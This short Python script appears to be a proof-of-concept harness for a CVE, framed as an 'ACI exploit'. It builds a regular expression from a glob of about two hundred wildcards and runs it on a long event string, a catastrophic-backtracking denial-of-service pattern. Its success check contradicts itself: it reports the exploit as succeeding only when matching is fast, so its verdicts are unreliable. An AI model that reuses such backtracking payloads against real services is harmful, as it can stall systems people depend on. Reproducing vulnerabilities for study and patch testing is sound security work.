import re
import time
import signal

# Timeout handler
def handler(signum, frame):
    print("The ACI exploit failed!!! - Timeout")
    exit(1)

signal.signal(signal.SIGALRM, handler)
signal.alarm(10)  # Set timeout for 10 seconds

def glob_to_regex(glob):
    """Converts a glob pattern to a regular expression."""
    regex = ''
    i = 0
    while i < len(glob):
        char = glob[i]
        if char == '*':
            regex += '.*'
        elif char == '?':
            regex += '.'
        else:
            regex += re.escape(char)
        i += 1
    return '^' + regex + '$'

def test_event_match_body():
    """Test function to simulate CVE by using a complex matching pattern."""
    event_body = "user_input_event" * 1000  # Simulate a moderate length event
    pattern = "user_*input*" * 100  # Pattern that causes poor performance
    regex_pattern = glob_to_regex(pattern)
    start_time = time.time()
    match = re.match(regex_pattern, event_body)
    end_time = time.time()
    duration = end_time - start_time
    if match and duration < 2:  # Check if the match is successful and within reasonable time
        print("The ACI exploit success!!!")
    else:
        print("The ACI exploit failed!!!")

test_event_match_body()
